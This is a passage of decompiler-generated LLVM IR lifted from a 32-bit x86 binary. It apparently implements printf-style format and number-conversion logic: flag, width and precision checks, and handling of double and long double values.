  %v1_804c1f4 = add i32 %v0_804c1f4, 12
  store i32 %v1_804c1f4, i32* %edx.global-to-local, align 4
  %v0_804c1f7 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c1f7 = add i32 %v0_804c1f7, 1
  %v1_804c1f8.pre = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v1_804c1f7, i32* %eax.global-to-local, align 4
  %v2_804c1f8 = sub i32 %v1_804c1f7, %v1_804c1f8.pre
  %v8_804c1f8 = xor i32 %v1_804c1f7, %v1_804c1f8.pre
  %v9_804c1f8 = xor i32 %v2_804c1f8, %v1_804c1f7
  %v10_804c1f8 = and i32 %v9_804c1f8, %v8_804c1f8
  %v11_804c1f8 = icmp slt i32 %v10_804c1f8, 0
  %v13_804c1f8 = icmp slt i32 %v2_804c1f8, 0
  %v2_804c1fa = icmp eq i1 %v13_804c1f8, %v11_804c1f8
  %v0_804c1fc = load i32, i32* @esp, align 4
  br i1 %v2_804c1fa, label %dec_label_pc_804c1fc, label %dec_label_pc_804c1ed

dec_label_pc_804c1fc:                             ; preds = %dec_label_pc_804c1ed, %dec_label_pc_804c1e5
  %v0_804c1fc.lcssa = phi i32 [ %v1_804c1d0, %dec_label_pc_804c1e5 ], [ %v0_804c1fc, %dec_label_pc_804c1ed ]
  %v1_804c1fc = add i32 %v0_804c1fc.lcssa, 48
  %v2_804c1fc = inttoptr i32 %v1_804c1fc to i32*
  %v3_804c1fc = load i32, i32* %v2_804c1fc, align 4
  store i32 %v3_804c1fc, i32* %ecx.global-to-local, align 4
  %v1_804c200 = icmp eq i32 %v3_804c1fc, 0
  %v2_804c200 = icmp slt i32 %v3_804c1fc, 0
  store i1 %v2_804c200, i1* %sf.global-to-local, align 1
  %v1_804c202 = icmp eq i1 %v1_804c200, false
  br i1 %v1_804c202, label %dec_label_pc_804c22a, label %dec_label_pc_804c204

dec_label_pc_804c204:                             ; preds = %dec_label_pc_804c1fc
  %v1_804c204 = inttoptr i32 %v0_804c1fc.lcssa to i32*
  %v2_804c204 = load i32, i32* %v1_804c204, align 4
  store i32 %v2_804c204, i32* %eax.global-to-local, align 4
  %v1_804c207 = ashr i32 %v2_804c204, 31
  store i32 %v1_804c207, i32* %edx.global-to-local, align 4
  %v2_804c208 = add i32 %v0_804c1fc.lcssa, -4
  %v3_804c208 = inttoptr i32 %v2_804c208 to i32*
  store i32 %v1_804c207, i32* %v3_804c208, align 4
  %v0_804c209 = load i32, i32* %eax.global-to-local, align 4
  %v2_804c209 = add i32 %v0_804c1fc.lcssa, -8
  %v3_804c209 = inttoptr i32 %v2_804c209 to i32*
  store i32 %v0_804c209, i32* %v3_804c209, align 4
  %v1_804c20a = add i32 %v0_804c1fc.lcssa, 32
  %v2_804c20a = inttoptr i32 %v1_804c20a to i32*
  %v3_804c20a = load i32, i32* %v2_804c20a, align 4
  %v1_804c20e = and i32 %v3_804c20a, 3840
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 %v1_804c20e, i32* %eax.global-to-local, align 4
  %v2_804c213 = add i32 %v0_804c1fc.lcssa, -12
  %v3_804c213 = inttoptr i32 %v2_804c213 to i32*
  store i32 %v1_804c20e, i32* %v3_804c213, align 4
  %v1_804c214 = add i32 %v0_804c1fc.lcssa, 344
  %v2_804c214 = inttoptr i32 %v1_804c214 to i32*
  %v3_804c214 = load i32, i32* %v2_804c214, align 4
  store i32 %v3_804c214, i32* %eax.global-to-local, align 4
  %v1_804c21b = inttoptr i32 %v3_804c214 to i32*
  %v2_804c21b = load i32, i32* %v1_804c21b, align 4
  %v4_804c21b = add i32 %v0_804c1fc.lcssa, -16
  %v5_804c21b = inttoptr i32 %v4_804c21b to i32*
  store i32 %v2_804c21b, i32* %v5_804c21b, align 4
  %v0_804c21d = call i32 @function_804fbc0()
  store i32 %v0_804c21d, i32* %eax.global-to-local, align 4
  %v0_804c222 = load i32, i32* @esp, align 4
  %v1_804c222 = add i32 %v0_804c222, 16
  %v7_804c222 = icmp slt i32 %v1_804c222, 0
  store i1 %v7_804c222, i1* %sf.global-to-local, align 1
  br label %dec_label_pc_804c66c

dec_label_pc_804c22a:                             ; preds = %dec_label_pc_804c1fc
  %v1_804c22a = add i32 %v3_804c1fc, -7
  %v5_804c22a = icmp ult i32 %v3_804c1fc, 7
  %v9_804c22a = icmp eq i32 %v1_804c22a, 0
  %v10_804c22a = icmp slt i32 %v1_804c22a, 0
  store i1 %v10_804c22a, i1* %sf.global-to-local, align 1
  %v2_804c22d = or i1 %v5_804c22a, %v9_804c22a
  br i1 %v2_804c22d, label %dec_label_pc_804c233, label %dec_label_pc_804c397

dec_label_pc_804c233:                             ; preds = %dec_label_pc_804c22a
  %v1_804c233 = add i32 %v3_804c1fc, 134558716
  %v2_804c233 = inttoptr i32 %v1_804c233 to i8*
  %v3_804c233 = load i8, i8* %v2_804c233, align 1
  %v4_804c233 = sext i8 %v3_804c233 to i32
  store i32 %v4_804c233, i32* @esi, align 4
  store i32 87, i32* @ebx, align 4
  %v9_804c23f = icmp eq i8 %v3_804c233, 10
  %v10_804c23f = icmp slt i8 %v3_804c233, 10
  store i1 %v10_804c23f, i1* %sf.global-to-local, align 1
  %v1_804c242 = icmp eq i1 %v9_804c23f, false
  br i1 %v1_804c242, label %dec_label_pc_804c262, label %dec_label_pc_804c244

dec_label_pc_804c244:                             ; preds = %dec_label_pc_804c233
  %v1_804c244 = add i32 %v0_804c1fc.lcssa, 32
  %v2_804c244 = inttoptr i32 %v1_804c244 to i32*
  %v3_804c244 = load i32, i32* %v2_804c244, align 4
  store i32 %v3_804c244, i32* %eax.global-to-local, align 4
  %v1_804c24a = udiv i32 %v3_804c244, 32
  %tmp66 = urem i32 %v1_804c24a, 2
  %tmp67 = sub nsw i32 45, %tmp66
  %v2_804c25a = or i32 %tmp67, 128
  store i32 %v2_804c25a, i32* %edx.global-to-local, align 4
  %v2_804c25d = and i32 %v3_804c244, 64
  %v3_804c25d = icmp eq i32 %v2_804c25d, 0
  store i1 false, i1* %sf.global-to-local, align 1
  %v1_804c25f = icmp eq i1 %v3_804c25d, false
  %v4_804c25f = select i1 %v1_804c25f, i32 %v2_804c25a, i32 %tmp67
  store i32 %v4_804c25f, i32* @ebx, align 4
  br label %dec_label_pc_804c262

dec_label_pc_804c262:                             ; preds = %dec_label_pc_804c233, %dec_label_pc_804c244
  %v1_804c262 = add i32 %v3_804c1fc, -5
  %v5_804c262 = icmp ult i32 %v3_804c1fc, 5
  %v9_804c262 = icmp eq i32 %v1_804c262, 0
  %v10_804c262 = icmp slt i32 %v1_804c262, 0
  store i1 %v10_804c262, i1* %sf.global-to-local, align 1
  %v2_804c265 = or i1 %v5_804c262, %v9_804c262
  br i1 %v2_804c265, label %dec_label_pc_804c267, label %dec_label_pc_804c27f

dec_label_pc_804c267:                             ; preds = %dec_label_pc_804c262
  %v1_804c267 = add i32 %v3_804c1fc, -3
  %v9_804c267 = icmp eq i32 %v1_804c267, 0
  %v10_804c267 = icmp slt i32 %v1_804c267, 0
  store i1 %v10_804c267, i1* %sf.global-to-local, align 1
  %v1_804c26a = icmp eq i1 %v9_804c267, false
  br i1 %v1_804c26a, label %dec_label_pc_804c273, label %dec_label_pc_804c26c

dec_label_pc_804c26c:                             ; preds = %dec_label_pc_804c267
  store i32 55, i32* @ebx, align 4
  br label %dec_label_pc_804c281

dec_label_pc_804c273:                             ; preds = %dec_label_pc_804c267
  %v1_804c273 = add i32 %v3_804c1fc, -1
  %v9_804c273 = icmp eq i32 %v1_804c273, 0
  %v10_804c273 = icmp slt i32 %v1_804c273, 0
  store i1 %v10_804c273, i1* %sf.global-to-local, align 1
  br i1 %v9_804c273, label %dec_label_pc_804c286, label %dec_label_pc_804c281

dec_label_pc_804c27f:                             ; preds = %dec_label_pc_804c262
  %v1_804c27f = sub nsw i32 0, %v4_804c233
  %v7_804c27f = icmp sgt i8 %v3_804c233, 0
  store i1 %v7_804c27f, i1* %sf.global-to-local, align 1
  store i32 %v1_804c27f, i32* @esi, align 4
  br label %dec_label_pc_804c281

dec_label_pc_804c281:                             ; preds = %dec_label_pc_804c273, %dec_label_pc_804c26c, %dec_label_pc_804c27f
  br label %dec_label_pc_804c286

dec_label_pc_804c286:                             ; preds = %dec_label_pc_804c273, %dec_label_pc_804c281
  %storemerge = phi i32 [ 11, %dec_label_pc_804c281 ], [ 6, %dec_label_pc_804c273 ]
  store i32 %storemerge, i32* @ebp, align 4
  %v1_804c286 = add i32 %v0_804c1fc.lcssa, 20
  %v2_804c286 = inttoptr i32 %v1_804c286 to i32*
  %v3_804c286 = load i32, i32* %v2_804c286, align 4
  %v5_804c286 = icmp slt i32 %v3_804c286, 0
  store i1 %v5_804c286, i1* %sf.global-to-local, align 1
  %v1_804c28b = add i32 %v0_804c1fc.lcssa, 7
  %v2_804c28b = inttoptr i32 %v1_804c28b to i8*
  store i8 32, i8* %v2_804c28b, align 1
  %v0_804c290 = load i1, i1* %sf.global-to-local, align 1
  %v1_804c290 = icmp eq i1 %v0_804c290, false
  br i1 %v1_804c290, label %dec_label_pc_804c29a, label %dec_label_pc_804c292

dec_label_pc_804c292:                             ; preds = %dec_label_pc_804c286
  %v0_804c292 = load i32, i32* @esp, align 4
  %v1_804c292 = add i32 %v0_804c292, 36
  %v2_804c292 = inttoptr i32 %v1_804c292 to i8*
  %v3_804c292 = load i8, i8* %v2_804c292, align 1
  %v4_804c292 = zext i8 %v3_804c292 to i32
  %v5_804c292 = load i32, i32* %edx.global-to-local, align 4
  %v6_804c292 = and i32 %v5_804c292, -256
  %v7_804c292 = or i32 %v6_804c292, %v4_804c292
  store i32 %v7_804c292, i32* %edx.global-to-local, align 4
  %v3_804c296 = add i32 %v0_804c292, 7
  %v4_804c296 = inttoptr i32 %v3_804c296 to i8*
  store i8 %v3_804c292, i8* %v4_804c296, align 1
  br label %dec_label_pc_804c29a

dec_label_pc_804c29a:                             ; preds = %dec_label_pc_804c286, %dec_label_pc_804c292
  %v1_804c29a = add i32 %v3_804c1fc, -1
  %v8_804c29a = icmp eq i32 %v1_804c29a, 0
  %v9_804c29a = icmp slt i32 %v1_804c29a, 0
  store i1 %v9_804c29a, i1* %sf.global-to-local, align 1
  store i32 %v1_804c29a, i32* %ecx.global-to-local, align 4
  %v0_804c29b = load i32, i32* @esp, align 4
  %v1_804c29b = add i32 %v0_804c29b, 344
  %v2_804c29b = inttoptr i32 %v1_804c29b to i32*
  %v3_804c29b = load i32, i32* %v2_804c29b, align 4
  store i32 %v3_804c29b, i32* %eax.global-to-local, align 4
  store i32 1024, i32* %edx.global-to-local, align 4
  %v0_804c2b3.pre = load i32, i32* @edi, align 4
  br i1 %v8_804c29a, label %dec_label_pc_804c2b3, label %dec_label_pc_804c2a9

dec_label_pc_804c2a9:                             ; preds = %dec_label_pc_804c29a
  %v2_804c2a9 = mul i32 %v0_804c2b3.pre, 4
  %v3_804c2a9 = add i32 %v0_804c29b, 52
  %v4_804c2a9 = add i32 %v3_804c2a9, %v2_804c2a9
  %v5_804c2a9 = inttoptr i32 %v4_804c2a9 to i32*
  %v6_804c2a9 = load i32, i32* %v5_804c2a9, align 4
  %v1_804c2ad = and i32 %v6_804c2a9, 3840
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 %v1_804c2ad, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804c2b3

dec_label_pc_804c2b3:                             ; preds = %dec_label_pc_804c29a, %dec_label_pc_804c2a9
  %v2_804c2b3 = add i32 %v0_804c29b, -4
  %v3_804c2b3 = inttoptr i32 %v2_804c2b3 to i32*
  store i32 %v0_804c2b3.pre, i32* %v3_804c2b3, align 4
  %v0_804c2b4 = load i32, i32* @esi, align 4
  %v2_804c2b4 = add i32 %v0_804c29b, -8
  %v3_804c2b4 = inttoptr i32 %v2_804c2b4 to i32*
  store i32 %v0_804c2b4, i32* %v3_804c2b4, align 4
  %v0_804c2b5 = load i32, i32* %eax.global-to-local, align 4
  %v2_804c2b5 = add i32 %v0_804c29b, -12
  %v3_804c2b5 = inttoptr i32 %v2_804c2b5 to i32*
  store i32 %v0_804c2b5, i32* %v3_804c2b5, align 4
  %v0_804c2b6 = load i32, i32* %edx.global-to-local, align 4
  %v2_804c2b6 = add i32 %v0_804c29b, -16
  %v3_804c2b6 = inttoptr i32 %v2_804c2b6 to i32*
  store i32 %v0_804c2b6, i32* %v3_804c2b6, align 4
  %v0_804c2b7 = call i32 @function_804fb68()
  %v0_804c2bc = load i32, i32* @ebx, align 4
  %v1_804c2bc = load i32, i32* @esp, align 4
  %v2_804c2bc = inttoptr i32 %v1_804c2bc to i32*
  store i32 %v0_804c2bc, i32* %v2_804c2bc, align 4
  %v0_804c2bf = load i32, i32* @esi, align 4
  %v1_804c2bf = load i32, i32* @esp, align 4
  %v2_804c2bf = add i32 %v1_804c2bf, -4
  %v3_804c2bf = inttoptr i32 %v2_804c2bf to i32*
  store i32 %v0_804c2bf, i32* %v3_804c2bf, align 4
  %v0_804c2c0 = load i32, i32* @edx, align 4
  %v2_804c2c0 = add i32 %v1_804c2bf, -8
  %v3_804c2c0 = inttoptr i32 %v2_804c2c0 to i32*
  store i32 %v0_804c2c0, i32* %v3_804c2c0, align 4
  %v2_804c2c1 = add i32 %v1_804c2bf, -12
  %v3_804c2c1 = inttoptr i32 %v2_804c2c1 to i32*
  store i32 %v0_804c2b7, i32* %v3_804c2c1, align 4
  %v1_804c2c2 = add i32 %v1_804c2bf, 347
  store i32 %v1_804c2c2, i32* %eax.global-to-local, align 4
  %v2_804c2c9 = add i32 %v1_804c2bf, -16
  %v3_804c2c9 = inttoptr i32 %v2_804c2c9 to i32*
  store i32 %v1_804c2c2, i32* %v3_804c2c9, align 4
  %v0_804c2ca = load i32, i32* %stack_var_-364, align 4
  %v5_804c2ca = inttoptr i32 %v0_804c2ca to i8*
  %v6_804c2ca = call i32 @function_804fc00(i8* %v5_804c2ca, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_804c2ca, i32* %eax.global-to-local, align 4
  %v0_804c2cf = load i32, i32* @esp, align 4
  %v1_804c2cf = add i32 %v0_804c2cf, 32
  %v1_804c2d2 = add i32 %v0_804c2cf, 80
  %v2_804c2d2 = inttoptr i32 %v1_804c2d2 to i32*
  %v3_804c2d2 = load i32, i32* %v2_804c2d2, align 4
  %v4_804c2d2 = add i32 %v3_804c2d2, -5
  %v8_804c2d2 = icmp ult i32 %v3_804c2d2, 5
  %v12_804c2d2 = icmp eq i32 %v4_804c2d2, 0
  %v13_804c2d2 = icmp slt i32 %v4_804c2d2, 0
  store i1 %v13_804c2d2, i1* %sf.global-to-local, align 1
  store i32 %v6_804c2ca, i32* @edi, align 4
  %v2_804c2d9 = or i1 %v8_804c2d2, %v12_804c2d2
  br i1 %v2_804c2d9, label %dec_label_pc_804c303, label %dec_label_pc_804c2db

dec_label_pc_804c2db:                             ; preds = %dec_label_pc_804c2b3
  %v7_804c2ca = inttoptr i32 %v6_804c2ca to i8*
  %v3_804c2db = load i8, i8* %v7_804c2ca, align 1
  %v4_804c2db = add i8 %v3_804c2db, -45
  %v12_804c2db = icmp eq i8 %v4_804c2db, 0
  %v13_804c2db = icmp slt i8 %v4_804c2db, 0
  store i1 %v13_804c2db, i1* %sf.global-to-local, align 1
  %v1_804c2de = icmp eq i1 %v12_804c2db, false
  %v1_804c2ed = add i32 %v0_804c2cf, 64
  %v2_804c2ed = inttoptr i32 %v1_804c2ed to i32*
  %v3_804c2ed = load i32, i32* %v2_804c2ed, align 4
  br i1 %v1_804c2de, label %dec_label_pc_804c2ed, label %dec_label_pc_804c2e0

dec_label_pc_804c2e0:                             ; preds = %dec_label_pc_804c2db
  %v4_804c2e0 = or i32 %v3_804c2ed, 2
  store i32 %v4_804c2e0, i32* %v2_804c2ed, align 4
  %v0_804c2e5 = load i32, i32* @edi, align 4
  %v1_804c2e5 = add i32 %v0_804c2e5, 1
  %v9_804c2e5 = icmp slt i32 %v1_804c2e5, 0
  store i1 %v9_804c2e5, i1* %sf.global-to-local, align 1
  store i32 %v1_804c2e5, i32* @edi, align 4
  store i32 2, i32* @ebp, align 4
  %v0_804c303.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804c303

dec_label_pc_804c2ed:                             ; preds = %dec_label_pc_804c2db
  store i32 %v3_804c2ed, i32* %eax.global-to-local, align 4
  %v2_804c2f1 = and i32 %v3_804c2ed, 2
  %v3_804c2f1 = icmp eq i32 %v2_804c2f1, 0
  store i1 false, i1* %sf.global-to-local, align 1
  br i1 %v3_804c2f1, label %dec_label_pc_804c2f9, label %dec_label_pc_804c2f5

dec_label_pc_804c2f5:                             ; preds = %dec_label_pc_804c2ed
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_804c303

dec_label_pc_804c2f9:                             ; preds = %dec_label_pc_804c2ed
  %v2_804c2f9 = urem i32 %v3_804c2ed, 2
  %v3_804c2f9 = icmp eq i32 %v2_804c2f9, 0
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 4, i32* %eax.global-to-local, align 4
  %v1_804c300 = icmp eq i1 %v3_804c2f9, false
  %v2_804c300 = load i32, i32* @ebp, align 4
  %v4_804c300 = select i1 %v1_804c300, i32 4, i32 %v2_804c300
  store i32 %v4_804c300, i32* @ebp, align 4
  br label %dec_label_pc_804c303

dec_label_pc_804c303:                             ; preds = %dec_label_pc_804c2b3, %dec_label_pc_804c2f5, %dec_label_pc_804c2e0, %dec_label_pc_804c2f9
  %v0_804c355 = phi i32 [ %v6_804c2ca, %dec_label_pc_804c2b3 ], [ %v6_804c2ca, %dec_label_pc_804c2f5 ], [ %v1_804c2e5, %dec_label_pc_804c2e0 ], [ %v6_804c2ca, %dec_label_pc_804c2f9 ]
  %v0_804c365 = phi i32 [ %v1_804c2cf, %dec_label_pc_804c2b3 ], [ %v1_804c2cf, %dec_label_pc_804c2f5 ], [ %v0_804c303.pre, %dec_label_pc_804c2e0 ], [ %v1_804c2cf, %dec_label_pc_804c2f9 ]
  %v1_804c303 = add i32 %v0_804c365, 20
  %v2_804c303 = inttoptr i32 %v1_804c303 to i32*
  %v3_804c303 = load i32, i32* %v2_804c303, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v1_804c307 = sub i32 204, %v0_804c355
  %v2_804c313 = add i32 %v1_804c307, %v0_804c365
  %v1_804c315 = add i32 %v2_804c313, 127
  store i32 %v1_804c315, i32* @esi, align 4
  %v2_804c318 = icmp slt i32 %v3_804c303, 0
  store i1 %v2_804c318, i1* %sf.global-to-local, align 1
  %v3_804c31a = select i1 %v2_804c318, i32 1, i32 %v3_804c303
  store i32 %v3_804c31a, i32* %ecx.global-to-local, align 4
  %v1_804c31d = add i32 %v0_804c365, 32
  %v2_804c31d = inttoptr i32 %v1_804c31d to i8*
  %v3_804c31d = load i8, i8* %v2_804c31d, align 1
  %v4_804c31d = and i8 %v3_804c31d, 16
  %v5_804c31d = icmp eq i8 %v4_804c31d, 0
  store i1 false, i1* %sf.global-to-local, align 1
  br i1 %v5_804c31d, label %dec_label_pc_804c355, label %dec_label_pc_804c324

dec_label_pc_804c324:                             ; preds = %dec_label_pc_804c303
  %v1_804c324 = add i32 %v0_804c365, 48
  %v2_804c324 = inttoptr i32 %v1_804c324 to i32*
  %v3_804c324 = load i32, i32* %v2_804c324, align 4
  store i32 %v3_804c324, i32* %edx.global-to-local, align 4
  store i32 6, i32* %eax.global-to-local, align 4
  %tmp68 = icmp ult i32 %v3_804c324, 3
  %v3_804c32d = load i32, i32* @ebp, align 4
  %v5_804c32d = select i1 %tmp68, i32 6, i32 %v3_804c32d
  store i32 %v5_804c32d, i32* @ebp, align 4
  %v1_804c330 = add i32 %v3_804c324, -3
  %v9_804c330 = icmp eq i32 %v1_804c330, 0
  %v10_804c330 = icmp slt i32 %v1_804c330, 0
  store i1 %v10_804c330, i1* %sf.global-to-local, align 1
  %v1_804c333 = icmp eq i1 %v9_804c330, false
  br i1 %v1_804c333, label %dec_label_pc_804c33c, label %dec_label_pc_804c335

dec_label_pc_804c335:                             ; preds = %dec_label_pc_804c324
  store i32 9, i32* @ebp, align 4
  br label %dec_label_pc_804c355

dec_label_pc_804c33c:                             ; preds = %dec_label_pc_804c324
  %v1_804c33c = add i32 %v3_804c324, -4
  %v9_804c33c = icmp eq i32 %v1_804c33c, 0
  %v10_804c33c = icmp slt i32 %v1_804c33c, 0
  store i1 %v10_804c33c, i1* %sf.global-to-local, align 1
  %v1_804c33f = icmp eq i1 %v9_804c33c, false
  br i1 %v1_804c33f, label %dec_label_pc_804c355, label %dec_label_pc_804c341

dec_label_pc_804c341:                             ; preds = %dec_label_pc_804c33c
  %v2_804c341 = sub i32 %v3_804c31a, %v1_804c315
  %v7_804c341 = icmp ult i32 %v3_804c31a, %v1_804c315
  %v12_804c341 = icmp eq i32 %v2_804c341, 0
  %v13_804c341 = icmp slt i32 %v2_804c341, 0
  store i1 %v13_804c341, i1* %sf.global-to-local, align 1
  %v2_804c343 = or i1 %v7_804c341, %v12_804c341
  br i1 %v2_804c343, label %dec_label_pc_804c345, label %dec_label_pc_804c355

dec_label_pc_804c345:                             ; preds = %dec_label_pc_804c341
  %v1_804c345 = inttoptr i32 %v0_804c355 to i8*
  %v2_804c345 = load i8, i8* %v1_804c345, align 1
  %v3_804c345 = add i8 %v2_804c345, -48
  %v8_804c345 = icmp eq i8 %v3_804c345, 0
  %v9_804c345 = icmp slt i8 %v3_804c345, 0
  store i1 %v9_804c345, i1* %sf.global-to-local, align 1
  store i32 1, i32* %ecx.global-to-local, align 4
  br i1 %v8_804c345, label %dec_label_pc_804c355, label %dec_label_pc_804c34f

dec_label_pc_804c34f:                             ; preds = %dec_label_pc_804c345
  %v1_804c34f = add i32 %v2_804c313, 128
  store i32 %v1_804c34f, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804c355

dec_label_pc_804c355:                             ; preds = %dec_label_pc_804c341, %dec_label_pc_804c345, %dec_label_pc_804c33c, %dec_label_pc_804c303, %dec_label_pc_804c335, %dec_label_pc_804c34f
  %v0_804c38e = phi i32 [ %v3_804c31a, %dec_label_pc_804c341 ], [ 1, %dec_label_pc_804c345 ], [ %v3_804c31a, %dec_label_pc_804c33c ], [ %v3_804c31a, %dec_label_pc_804c303 ], [ %v3_804c31a, %dec_label_pc_804c335 ], [ %v1_804c34f, %dec_label_pc_804c34f ]
  %v1_804c355 = inttoptr i32 %v0_804c355 to i8*
  %v2_804c355 = load i8, i8* %v1_804c355, align 1
  %v3_804c355 = add i8 %v2_804c355, -48
  %v8_804c355 = icmp eq i8 %v3_804c355, 0
  %v9_804c355 = icmp slt i8 %v3_804c355, 0
  store i1 %v9_804c355, i1* %sf.global-to-local, align 1
  %v1_804c358 = icmp eq i1 %v8_804c355, false
  br i1 %v1_804c358, label %dec_label_pc_804c386, label %dec_label_pc_804c35a

dec_label_pc_804c35a:                             ; preds = %dec_label_pc_804c355
  %v0_804c35a = load i32, i32* @ebp, align 4
  %v1_804c35a = add i32 %v0_804c35a, -6
  %v6_804c35a = sub i32 5, %v0_804c35a
  %v7_804c35a = and i32 %v6_804c35a, %v0_804c35a
  %v8_804c35a = icmp slt i32 %v7_804c35a, 0
  %v10_804c35a = icmp slt i32 %v1_804c35a, 0
  store i32 11, i32* %eax.global-to-local, align 4
  %v2_804c362 = icmp eq i1 %v10_804c35a, %v8_804c35a
  %v5_804c362 = select i1 %v2_804c362, i32 11, i32 %v0_804c35a
  store i32 %v5_804c362, i32* @ebp, align 4
  %v1_804c365 = add i32 %v0_804c365, 48
  %v2_804c365 = inttoptr i32 %v1_804c365 to i32*
  %v3_804c365 = load i32, i32* %v2_804c365, align 4
  %v4_804c365 = add i32 %v3_804c365, -1
  %v12_804c365 = icmp eq i32 %v4_804c365, 0
  %v13_804c365 = icmp slt i32 %v4_804c365, 0
  store i1 %v13_804c365, i1* %sf.global-to-local, align 1
  %v1_804c36a = icmp eq i1 %v12_804c365, false
  br i1 %v1_804c36a, label %dec_label_pc_804c37b, label %dec_label_pc_804c36c

dec_label_pc_804c36c:                             ; preds = %dec_label_pc_804c35a
  store i32 5, i32* @esi, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_80533e4.119 to i32), i32* @edi, align 4
  br label %dec_label_pc_804c505

dec_label_pc_804c37b:                             ; preds = %dec_label_pc_804c35a
  %v1_804c37b = icmp eq i32 %v0_804c38e, 0
  %v2_804c37b = icmp slt i32 %v0_804c38e, 0
  store i1 %v2_804c37b, i1* %sf.global-to-local, align 1
  %v1_804c37d = icmp eq i1 %v1_804c37b, false
  br i1 %v1_804c37d, label %dec_label_pc_804c386, label %dec_label_pc_804c37f

dec_label_pc_804c37f:                             ; preds = %dec_label_pc_804c37b
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_804c505

dec_label_pc_804c386:                             ; preds = %dec_label_pc_804c37b, %dec_label_pc_804c355
  %v2_804c386 = sub i32 %v0_804c38e, %v1_804c315
  %v7_804c386 = icmp ult i32 %v0_804c38e, %v1_804c315
  %v12_804c386 = icmp eq i32 %v2_804c386, 0
  %v13_804c386 = icmp slt i32 %v2_804c386, 0
  store i1 %v13_804c386, i1* %sf.global-to-local, align 1
  %v2_804c388 = or i1 %v7_804c386, %v12_804c386
  br i1 %v2_804c388, label %dec_label_pc_804c505, label %dec_label_pc_804c38e

dec_label_pc_804c38e:                             ; preds = %dec_label_pc_804c386
  store i1 %v13_804c386, i1* %sf.global-to-local, align 1
  store i32 %v2_804c386, i32* @ebx, align 4
  br label %dec_label_pc_804c51f

dec_label_pc_804c397:                             ; preds = %dec_label_pc_804c22a
  %v1_804c397 = add i32 %v3_804c1fc, -15
  %v5_804c397 = icmp ult i32 %v3_804c1fc, 15
  %v9_804c397 = icmp eq i32 %v1_804c397, 0
  %v10_804c397 = icmp slt i32 %v1_804c397, 0
  store i1 %v10_804c397, i1* %sf.global-to-local, align 1
  %v2_804c39a = or i1 %v5_804c397, %v9_804c397
  br i1 %v2_804c39a, label %dec_label_pc_804c39c, label %dec_label_pc_804c3e1

dec_label_pc_804c39c:                             ; preds = %dec_label_pc_804c397
  %v1_804c39c = add i32 %v0_804c1fc.lcssa, 33
  %v2_804c39c = inttoptr i32 %v1_804c39c to i8*
  %v3_804c39c = load i8, i8* %v2_804c39c, align 1
  %v4_804c39c = and i8 %v3_804c39c, 8
  %v5_804c39c = icmp eq i8 %v4_804c39c, 0
  store i1 false, i1* %sf.global-to-local, align 1
  %v1_804c3a1 = add i32 %v0_804c1fc.lcssa, 344
  %v2_804c3a1 = inttoptr i32 %v1_804c3a1 to i32*
  %v3_804c3a1 = load i32, i32* %v2_804c3a1, align 4
  store i32 %v3_804c3a1, i32* %edx.global-to-local, align 4
  br i1 %v5_804c39c, label %dec_label_pc_804c3ae, label %dec_label_pc_804c3aa

dec_label_pc_804c3aa:                             ; preds = %dec_label_pc_804c39c
  %v1_804c3aa = inttoptr i32 %v3_804c3a1 to x86_fp80*
  %v2_804c3aa = load x86_fp80, x86_fp80* %v1_804c3aa, align 4
  br label %dec_label_pc_804c3b0

dec_label_pc_804c3ae:                             ; preds = %dec_label_pc_804c39c
  %v1_804c3ae = inttoptr i32 %v3_804c3a1 to double*
  %v2_804c3ae = load double, double* %v1_804c3ae, align 4
  %v3_804c3ae = fpext double %v2_804c3ae to x86_fp80
  br label %dec_label_pc_804c3b0

dec_label_pc_804c3b0:                             ; preds = %dec_label_pc_804c3aa, %dec_label_pc_804c3ae
  %storemerge4 = phi x86_fp80 [ %v2_804c3aa, %dec_label_pc_804c3aa ], [ %v3_804c3ae, %dec_label_pc_804c3ae ]
  store x86_fp80 %storemerge4, x86_fp80* %st0.global-to-local, align 4
  %v0_804c3b0 = load i32, i32* @esi, align 4
  %v2_804c3b0 = add i32 %v0_804c1fc.lcssa, -4
  %v3_804c3b0 = inttoptr i32 %v2_804c3b0 to i32*
  store i32 %v0_804c3b0, i32* %v3_804c3b0, align 4
  %v0_804c3b1 = load i32, i32* @esi, align 4
  %v2_804c3b1 = add i32 %v0_804c1fc.lcssa, -8
  %v3_804c3b1 = inttoptr i32 %v2_804c3b1 to i32*
  store i32 %v0_804c3b1, i32* %v3_804c3b1, align 4
  %v1_804c3b2 = add i32 %v0_804c1fc.lcssa, -12
  %v2_804c3b2 = inttoptr i32 %v1_804c3b2 to i32*
  store i32 134529138, i32* %v2_804c3b2, align 4
  %v1_804c3b7 = add i32 %v0_804c1fc.lcssa, 20
  store i32 %v1_804c3b7, i32* %eax.global-to-local, align 4
  %v2_804c3bb = add i32 %v0_804c1fc.lcssa, -16
  %v3_804c3bb = inttoptr i32 %v2_804c3bb to i32*
  store i32 %v1_804c3b7, i32* %v3_804c3bb, align 4
  %v1_804c3bc = add i32 %v0_804c1fc.lcssa, -28
  %v10_804c3bc = icmp slt i32 %v1_804c3bc, 0
  store i1 %v10_804c3bc, i1* %sf.global-to-local, align 1
  %v1_804c3bf = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  %v3_804c3bf = inttoptr i32 %v1_804c3bc to x86_fp80*
  store x86_fp80 %v1_804c3bf, x86_fp80* %v3_804c3bf, align 4
  %v1_804c3c2 = add i32 %v0_804c1fc.lcssa, 368
  %v2_804c3c2 = inttoptr i32 %v1_804c3c2 to i32*
  %v3_804c3c2 = load i32, i32* %v2_804c3c2, align 4
  %v5_804c3c2 = add i32 %v0_804c1fc.lcssa, -32
  %v6_804c3c2 = inttoptr i32 %v5_804c3c2 to i32*
  store i32 %v3_804c3c2, i32* %v6_804c3c2, align 4
